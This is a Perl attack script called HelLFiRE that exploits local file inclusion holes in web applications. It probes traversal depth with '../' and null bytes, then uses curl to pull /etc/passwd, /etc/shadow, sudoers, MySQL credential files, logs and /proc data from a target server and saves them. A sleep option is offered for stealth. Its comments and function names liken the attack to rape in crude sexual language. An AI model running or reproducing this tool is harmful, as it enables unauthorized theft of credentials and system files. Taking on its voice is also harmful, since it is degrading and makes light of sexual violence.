#!/usr/bin/perl -w
# HelLFiRE - LFi Regular Expression.
# This is version 0.3 - HelLFiRE.
# 
# Coded by Douglas WeakNetLabs@Gmail.com
#
# (c) WeakNetLabs.com
#

# Please check the changelog.
use Term::ANSIColor;
use LWP;
use LWP::UserAgent;

# no buffer for dynamic fluid text:
select((select(STDOUT), $|=1)[0]);

# intro:
print color 'bold red'; 
print "\n  HelLFiRE";
print color 'reset'; 
print " - Regular Expression Powered \n  LFi Auto Recon Tool v0.3 r14\n";
print "  Coded by Douglas - WeakNetLabs\@Gmail.com\n\n";

# forgot arguments?
if (!$ARGV[0] || grep(/-(-)?h(elp)?/, @ARGV)) {
	print "  Usage: ./HelLFiRE -u url\n";
	print "  add -s seconds for sleep delay between requests.\n";
	print "  add -a \"USER AGENT\" to specify USER AGENT.\n\n";
	exit();
}

# Made it past help, or syntax error,
# so let's fill the stack a bit:
$url_vuln = "";
$url_append_file = "";
$url_append = "";
$sleep = 0;
$host = "";
my $dots = "../";
$depth = 0;
$win = 0;
$time = "";
$clock = "";
@time = ("","");
@files_pd = ("","");
@files_nf = ("","");
@files_ob = ("","");
# Easily appendable ARRAYs:
@etc = ("etc/host.conf","etc/hosts","etc/hosts.allow","etc/hosts.deny",
        "etc/inittab","etc/inputrc","etc/issue.net","etc/ld.so.conf",
        "etc/locale.alias","etc/login.defs","etc/mail.rc","etc/modules",
        "etc/motd","etc/motd.tail","etc/nsswitch.conf","etc/pam.conf",
        "etc/rc.local","etc/rmt","etc/rkhunter.conf","etc/rsyslog.conf",
        "etc/sudoers","etc/crontab","etc/aliases","etc/bash.bashrc",
        "etc/debconf.conf","etc/debian_version","etc/email-addresses",
        "etc/environment","etc/ftpusers","etc/gshadow","etc/gshadow",
        "etc/issue","etc/fstab","etc/profile","etc/lighttpd/lighttpd.conf",
        "etc/inetd","etc/network/interfaces","etc/resolv.conf",
        "etc/init.d/lighttpd","etc/init.d/rc.local","etc/groups",
        "etc/shadow", "etc/ca-certificates.conf", "etc/passwd");

@proc = ("proc/diskstats","proc/cpuinfo","proc/meminfo", "proc/mounts",
        "proc/iomem", "proc/mdstat", "proc/execdomains", "proc/locks",
        "proc/stat", "proc/swaps", "proc/kallsyms", "proc/loadavg",
        "proc/partitions", "proc/slabinfo", "proc/version", "proc/uptime",
        "proc/vmstat");

@mysql = ("etc/mysql/my.cnf","etc/init.d/mysql","etc/mysql/debian.cnf",
        "var/log/mysql.log","var/log/mysql.err");

@logs = ("var/log/lighttpd/access.log","var/log/exim4/mainlog","var/log/dmesg",
        "var/logsystem","var/logsys.log","var/log/messages",
        "var/log/proftpd/proftpd.log","var/log/proftpd/controls.log",
        "var/log/proftpd/xferlog","var/log/proftpd/xferreport",
        "var/log/kern.log","var/log/mail.err","var/log/lpr.log",
        "var/log/postgresql/postgresql-8.3-main.log","var/log/user.log");

@sys = ("sys/devices", "system/cpu/kernel_max");

# organize the arguments:
for($i=0;$i<$#ARGV;$i++) {
	chomp $ARGV[$i];
	if($ARGV[$i] eq '-u') { 
		$url_raw = $ARGV[$i+1];
	}elsif($ARGV[$i] eq '-s') { 
		$sleep = $ARGV[$i+1];
	}elsif($ARGV[$i] eq '-a') {
		$ua = $ARGV[$i+1];
	}else{}
}
my $ua2 = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $url_raw);
my $res = $ua2->request($req);
if($res->is_success) {
	print "[ ! ] Host: " . $url_raw . " seems up.\n";
}else{
	print "[ X ] Your URL or host seems down!\n";
	exit();
}

# USER AGENT required by some servers:
if(!$ua || $ua eq ''){
	print "[ ! ] No User Agent specified, using \"Mozilla\"\n";
	$ua = "Mozilla";
}else{
	print "[ ! ] USER AGENT: " . $ua . "\n";
}

# forgot hostame? non integer sleep?:
if (!$url_raw || ($sleep !~ /[0-9]+/)) {
	print "[ ? ] Our syntax is wrong.\n";
	print "[ ? ] Type: --help or -h for help.\n";
	exit();
}else { # all arguments OK
        $host = $url_raw; # Make clean arguments:
        $host =~ s/http:\/\///;
	$host =~ s/\/.*//g;
        $host =~ s/\/.*\/.*//g;
        $host =~ s/\/\.\///g;
        $url_vuln = $url_raw;
        $url_vuln =~ s/=.*/=/g;
	print "[ ! ] Creating directory " . $host . " for logs.\n";
	system("mkdir ../logs/scans/$host 2>/dev/null");
        print "[ ! ] Scan started for host: ";
        print color 'bold white';
        print $host;
        print color 'reset';
        print "\n";
	$url_append = $url_vuln;
	print "[ ! ] Testing depth of server's security hole.\n";
	logfile("open");
	print LOGFILE "[ ! ] Scan started for " . $host . "\n";
	print LOGFILE "[ ! ] Scan using vuln file: " . $url_vuln . "\n";
	print LOGFILE "[ ! ] Using USER AGENT: " . $ua . "\n";
	print LOGFILE "[ ! ] Stealth/Sleep: " . $sleep . "\n";
        depth("etc/passwd"); # get depth
}

sub timestamp {
	@time = localtime(time);
	$time = $time[3] . "." . $time[4] . "." . ($time[5] + 1900) . "@" . $time[2] . ":" . $time[1] . ":" . $time[0];
	$clock = $time[2] . ":" . $time[1] . ":" . $time[0];
}

sub logfile {
	if ($_[0] eq 'open') {
		my $logfile = $host;
		$logfile .= "/scan_log.txt";
		open(LOGFILE, ">>../logs/scans/$logfile") || die "[ X ] I can\'t write to my newly made directory!\n";
		timestamp();
		print LOGFILE "\n  LOG created by HelLFiRE Scan\n";
		print LOGFILE "  Started at: " . $time . " \n  " . int($time[5] + 1900) . " (c) WeakNetLabs.com\n\n";
		print LOGFILE "[ ! ] Started logfile " . $logfile . "\n"; 
	}elsif($_[0] eq 'close'){
		close LOGFILE;
	}else{
		# thair shoul be no else!
	}
}

sub depth { # get depth of inclusion vulnerability
	while ($depth == 0) {
		$url_append .= $dots;
		$url_append_file = $url_append;
		$url_append_file .= $_[0];
		print "[ ; ] She says to go deeper.\n"; 
		@file = `curl -A $ua $url_append_file 2>/dev/null`;
		if (grep(/failed to open stream/i, @file)) {
			print "[ ! ] Tested $url_append_file\n";
			print "[ ; ] Let\'s NULL byte her hole.\n";
			$url_append_file .= '%00';
			print "[ ! ] Testing $url_append_file\n";
			@file = `curl -A $ua $url_append_file 2>/dev/null`;
			if(!grep(/failed to open stream/i, @file)) {
				$depth = 1;
				rape();
			}
		}elsif(grep(/<title>.*not found.*<\/title>/i, @file)){
			print "[ X ] 404: File not found.\n\n";
			timestamp();
			print LOGFILE "[ " . $clock . " ] " . "Error: 404: File not found.\n";
			logfile("close");
			exit();
		}elsif(grep(/<title>.*404.*<\/title>/i, @file)){
			timestamp();
			print LOGFILE "[ " . $clock . " ] " . "Error: 404: File not found.\n";
			print "[ X ] 404: File not found.\n\n";
			logfile("close");
			exit();
		}elsif(grep(/<title>.*500.*<\/title>/i, @file)) { 
			timestamp();
			print LOGFILE "[ " . $clock . " ] " . "Error: 50X: Internal Server Error.\n";
			print "[ X ] Internal Server Error\n\n";
			logfile("close");
			exit();
		}else{
			$depth = 1;
			rape();
		}
	}
}

sub rape { # TAKER FIR ALL SHES GOAT CAPN!
        print "[ ! ] She says... ORGASM!!\n";
        # get etc files:
        foreach (@etc) { getFiles($_); if($sleep > 0) { stealth(); } }
        # get proc files:
        foreach (@proc) { getFiles($_); if($sleep > 0) { stealth(); } }
        # get log files:
        foreach (@logs) { getFiles($_); if($sleep > 0) { stealth(); } }
        # get sys files:
        foreach (@sys) { getFiles($_); if($sleep > 0) { stealth(); } }
	# get mysql files:
	foreach (@mysql) { getFiles($_); if($sleep > 0) { stealth(); } }
        clearline();
        if ($win > 0) {
		clearline();
		clearline();
       		print "[ ! ] Scan completed, please check the ../logs/scans/" . $host . " directory for files\n";
		timestamp();
		print LOGFILE "[ ! ] " . $win . " files pwned from server.\n\n";
		print "[ ! ] " . $win . " files raped from server\n";
		# Let's now log them all neatly and timestamped:
		print LOGFILE "[ OB ] Files obtained from server using vulnerability:\n\n";
		foreach(@files_ob) {
			print LOGFILE $_;
		}
		print LOGFILE "\n\n";
		print LOGFILE "[ NF ] Files Not Found on Server:\n\n";
		foreach(@files_nf) { 
			print LOGFILE $_;
		}
		print LOGFILE "\n\n";
		print LOGFILE "[ PD ] Persmission Denied while reading:\n\n";
		foreach(@files_pd) { 
			print LOGFILE $_;
		}
		print LOGFILE "\n\n";
		logfile("close");
        }

}

sub getFiles { # actual function to get files:
	my $logfile = $_[0];
	$logfile =~ s/\//\./g; # this is make log files
	clearline();
	print "[ ! ] Trying file: " . $_[0] . " for inclusion";
	@file = `curl -A $ua $url_append$_[0] 2>/dev/null`;
	if (grep(/failed to open stream/i, @file)) {
		clearline();
		print "[ X ] Unable to get file " . $_[0];
		if(grep(/permission denied/i, @file)) {
			timestamp();
			#print LOGFILE "[ " . $clock . " ] " . $_[0] . "\n";
			my $error = "[ " . $clock . " ] " . $_[0] . "\n";
			push(@files_pd, $error);
		}elsif(grep(/no such file or direct/i, @file)){
			timestamp();
			#print LOGFILE "[ " . $clock . " ] " . $_[0] . "\n";
			my $error = "[ " . $clock . " ] " . $_[0] . "\n";
			push(@files_nf, $error);
		}
	}else{
		$win++;
		clearline();
		print "[ ! ] Got file " . $_[0] . "!";
		open(LOG, ">../logs/scans/$host/$logfile") || die "[ X ] Could not write to log directory! wtf?!\n";
		timestamp();
		my $error = "[ " . $clock . " ] " . $_[0] . "\n";
		push(@files_ob, $error);
		foreach(@file) { 
			$_ =~ s/<.*>//g;
			print LOG $_;
		}close LOG;
	}
}

sub stealth {
	sleep($sleep); # some servers shit themselves while being raped.
}

sub clearline { 
	print "\r                                                                 \r";
	print "\r                                                                 \r";

}
print "\n";
